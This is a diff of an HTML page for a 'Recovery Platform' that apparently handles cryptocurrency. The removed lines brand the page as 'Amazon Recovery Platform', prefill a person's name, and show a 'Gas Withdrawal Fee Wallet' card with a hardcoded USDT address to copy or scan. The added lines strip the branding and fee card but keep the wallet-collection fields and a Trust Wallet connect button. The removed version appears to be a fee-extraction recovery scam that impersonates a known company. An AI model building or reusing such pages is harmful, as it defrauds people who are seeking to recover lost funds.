@@ -4,384 +4,253 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <meta
-    name="description"
-    content="Amazon Recovery Platform"
-  >
-
-  <title>Amazon Recovery Platform</title>
-
+  <meta name="description" content="Recovery Platform">
+  <title>Recovery Platform</title>
   <link rel="stylesheet" href="Styles.css">
 </head>
 
 <body>
 
-  <!-- LOGIN -->
-  <main id="loginScreen" class="login-screen">
-
+  <div id="loginScreen" class="login-screen">
     <div class="login-card">
 
-      <div class="login-brand">
-        <div class="brand-logo">AR</div>
+      <div class="brand-mark">R</div>
 
-        <div>
-          <h1>Amazon Recovery Platform</h1>
-          <span>Secure Platform Access</span>
-        </div>
-      </div>
+      <div class="brand-name">Recovery Platform</div>
+      <div class="brand-subtitle">Secure Platform Access</div>
 
-      <div class="login-heading">
-        <h2>Welcome</h2>
-        <p>Enter your username to continue.</p>
-      </div>
+      <h1>Welcome</h1>
+      <p class="login-description">
+        Enter your username to continue.
+      </p>
 
       <form id="loginForm" autocomplete="off">
 
-        <label for="username">
-          Username
-        </label>
+        <label for="username">Username</label>
 
         <input
-          type="text"
           id="username"
           name="username"
-          value="محمود الشبيلات"
+          type="text"
+          placeholder="Enter username"
           autocomplete="off"
+          spellcheck="false"
+          dir="auto"
           required
         >
 
-        <button
-          type="submit"
-          class="primary-button"
-        >
+        <button type="submit" class="primary-button">
           Continue
-          <span>→</span>
         </button>
 
       </form>
 
     </div>
+  </div>
 
-  </main>
 
-
-  <!-- PLATFORM -->
   <main id="platformScreen" class="platform-screen hidden">
 
-    <!-- HEADER -->
-    <header class="top-header">
+    <header class="topbar">
 
-      <div class="header-inner">
+      <div class="brand-area">
 
-        <div class="brand-area">
+        <div class="brand-mark small">R</div>
 
-          <div class="brand-logo header-logo">
-            AR
-          </div>
-
-          <div class="brand-text">
-            <strong>Amazon Recovery Platform</strong>
-            <span>Secure Platform</span>
-          </div>
-
+        <div>
+          <div class="brand-name">Recovery Platform</div>
+          <div class="brand-subtitle">Secure Access</div>
         </div>
 
-        <button
-          type="button"
-          id="connectTrustWalletButton"
-          class="trust-button"
-        >
-          <span class="trust-dot"></span>
-          Connect Trust Wallet
-        </button>
+      </div>
 
+      <div class="secure-badge">
+        Secure
       </div>
 
     </header>
 
 
-    <!-- HERO -->
-    <section class="hero-section">
+    <section class="hero">
 
-      <div class="hero-inner">
+      <div class="hero-content">
 
-        <div class="hero-content">
+        <span class="eyebrow">
+          RECOVERY PLATFORM
+        </span>
 
-          <span class="hero-tag">
-            AMAZON RECOVERY PLATFORM
-          </span>
+        <h1>
+          Welcome,
+          <span id="displayUsername"></span>
+        </h1>
 
-          <h1>
-            Welcome,
-            <span id="displayUsername" dir="auto"></span>
-          </h1>
+        <p>
+          Manage your public wallet information securely.
+        </p>
 
-          <p>
-            Manage your wallet information from one secure platform.
-          </p>
+      </div>
 
-        </div>
-
-        <div class="hero-decoration">
-          <div class="hero-circle circle-one"></div>
-          <div class="hero-circle circle-two"></div>
-
-          <div class="hero-shield">
-            ✓
-          </div>
-        </div>
-
+      <div class="hero-icon">
+        ✓
       </div>
 
     </section>
 
 
-    <!-- CONTENT -->
-    <section class="platform-container">
+    <section class="content">
 
       <div class="section-heading">
-
-        <div>
-          <span>WALLET INFORMATION</span>
-          <h2>Account Information</h2>
-        </div>
-
+        <span>ACCOUNT INFORMATION</span>
+        <h2>Wallet Information</h2>
       </div>
 
 
-      <div class="wallet-grid">
+      <div class="cards">
 
 
         <!-- CONNECT WALLET ID -->
-        <section class="wallet-card wallet-primary">
 
-          <div class="card-top">
+        <article class="info-card">
 
-            <div class="card-icon blue-icon">
-              ◇
-            </div>
+          <div class="card-number">01</div>
 
-            <span class="card-number">
-              01
-            </span>
-
+          <div class="card-icon">
+            ◇
           </div>
 
-          <div class="card-content">
+          <h3>Connect Wallet ID</h3>
 
-            <h3>
-              Connect Wallet ID
-            </h3>
+          <p>
+            Enter your public EVM wallet address.
+          </p>
 
-            <p>
-              Enter a valid EVM wallet address.
-            </p>
+          <label for="walletId">
+            Public Wallet Address
+          </label>
 
-            <label for="walletId">
-              Wallet ID
-            </label>
-
-            <div class="wallet-input-row">
-
-              <input
-                type="text"
-                id="walletId"
-                name="walletId"
-                placeholder="0x..."
-                autocomplete="off"
-                spellcheck="false"
-                inputmode="text"
-              >
-
-              <button
-                type="button"
-                id="saveWalletButton"
-                class="save-button"
-              >
-                Save
-              </button>
-
-            </div>
-
-            <div
-              id="walletValidationMessage"
-              class="validation-message"
-              aria-live="polite"
-            ></div>
-
-            <div
-              id="walletSavedMessage"
-              class="saved-message"
-              aria-live="polite"
-            ></div>
-
-          </div>
-
-        </section>
-
-
-        <!-- WITHDRAWAL WALLET ADDRESS -->
-        <section class="wallet-card">
-
-          <div class="card-top">
-
-            <div class="card-icon purple-icon">
-              ⇄
-            </div>
-
-            <span class="card-number">
-              02
-            </span>
-
-          </div>
-
-          <div class="card-content">
-
-            <h3>
-              Withdrawal Wallet Address
-            </h3>
-
-            <p>
-              Enter the public wallet address associated with withdrawals.
-            </p>
-
-            <label for="withdrawalWallet">
-              Wallet Address
-            </label>
+          <div class="input-row">
 
             <input
+              id="walletId"
               type="text"
-              id="withdrawalWallet"
-              name="withdrawalWallet"
               placeholder="0x..."
               autocomplete="off"
               spellcheck="false"
-              inputmode="text"
             >
-
-          </div>
-
-        </section>
-
-
-        <!-- GAS WITHDRAWAL FEE WALLET -->
-        <section class="wallet-card address-card">
-
-          <div class="card-top">
-
-            <div class="card-icon green-icon">
-              ₿
-            </div>
-
-            <span class="card-number">
-              03
-            </span>
-
-          </div>
-
-          <div class="card-content">
-
-            <h3>
-              Gas Withdrawal Fee Wallet
-            </h3>
-
-            <p>
-              USDT · BEP-20 Network
-            </p>
-
-            <div class="public-address-box">
-
-              <span
-                id="gasWalletAddress"
-                dir="ltr"
-              >
-                0xeF43F8F28dC19DAE233A19adfee8C109E4a1bfBf
-              </span>
-
-            </div>
 
             <button
+              id="saveWalletButton"
               type="button"
-              id="copyGasWalletButton"
-              class="copy-button"
+              class="save-button"
             >
-              Copy Wallet Address
+              Save
             </button>
-
-            <div
-              id="copyMessage"
-              class="copy-message"
-              aria-live="polite"
-            ></div>
-
-            <div class="qr-section">
-
-              <div
-                id="walletQr"
-                class="qr-placeholder"
-                aria-label="Wallet address QR code"
-              >
-                QR
-              </div>
-
-              <div class="qr-info">
-                <strong>Wallet Address QR</strong>
-
-                <span>
-                  Scan the public wallet address.
-                </span>
-              </div>
-
-            </div>
 
           </div>
 
-        </section>
+          <div
+            id="walletValidationMessage"
+            class="validation-message"
+          ></div>
+
+          <div
+            id="walletSavedMessage"
+            class="success-message"
+          ></div>
+
+        </article>
+
+
+        <!-- WITHDRAWAL WALLET -->
+
+        <article class="info-card">
+
+          <div class="card-number">02</div>
+
+          <div class="card-icon">
+            ⇄
+          </div>
+
+          <h3>Withdrawal Wallet Address</h3>
+
+          <p>
+            Enter the public wallet address associated
+            with withdrawals.
+          </p>
+
+          <label for="withdrawalWallet">
+            Wallet Address
+          </label>
+
+          <input
+            id="withdrawalWallet"
+            type="text"
+            placeholder="Enter withdrawal wallet address"
+            autocomplete="off"
+            spellcheck="false"
+          >
+
+          <div class="wallet-note">
+            Public wallet information only.
+          </div>
+
+        </article>
+
+
+        <!-- WALLET CONNECTION -->
+
+        <article class="info-card">
+
+          <div class="card-number">03</div>
+
+          <div class="card-icon green">
+            ₿
+          </div>
+
+          <h3>Wallet Connection</h3>
+
+          <p>
+            Connect a compatible wallet provider
+            to display its public address.
+          </p>
+
+          <button
+            id="connectTrustWalletButton"
+            type="button"
+            class="wallet-button"
+          >
+            <span class="trust-dot"></span>
+            Connect Trust Wallet
+          </button>
+
+          <div
+            id="walletConnectionStatus"
+            class="connection-status"
+          ></div>
+
+        </article>
+
 
       </div>
 
 
-      <!-- TRUST WALLET STATUS -->
-      <section class="wallet-connection-panel">
-
-        <div class="connection-icon">
-          ◇
-        </div>
-
-        <div class="connection-content">
-
-          <strong>
-            Trust Wallet Connection
-          </strong>
-
-          <p id="walletConnectionStatus">
-            No wallet connected.
-          </p>
-
-        </div>
-
-      </section>
-
-
-      <!-- SECURITY INFORMATION -->
-      <section class="information-panel">
-
-        <div class="info-icon">
-          i
-        </div>
+      <section class="network-card">
 
         <div>
+          <span class="network-label">
+            NETWORK INFORMATION
+          </span>
 
-          <strong>
-            Wallet information
-          </strong>
+          <h2>Public Wallet Information</h2>
 
           <p>
-            Only enter public wallet addresses. Never enter a private key
-            or recovery phrase.
+            Only public wallet addresses should be entered.
+            Never enter a seed phrase or private key.
           </p>
+        </div>
 
+        <div class="network-pill">
+          EVM Compatible
         </div>
 
       </section>
@@ -389,25 +258,9 @@
     </section>
 
 
-    <!-- FOOTER -->
-    <footer class="platform-footer">
-
-      <div class="footer-brand">
-
-        <div class="brand-logo footer-logo">
-          AR
-        </div>
-
-        <span>
-          Amazon Recovery Platform
-        </span>
-
-      </div>
-
-      <span class="footer-copy">
-        Secure Platform
-      </span>
-
+    <footer>
+      <span>Recovery Platform</span>
+      <span>Public wallet information only</span>
     </footer>
 
   </main>
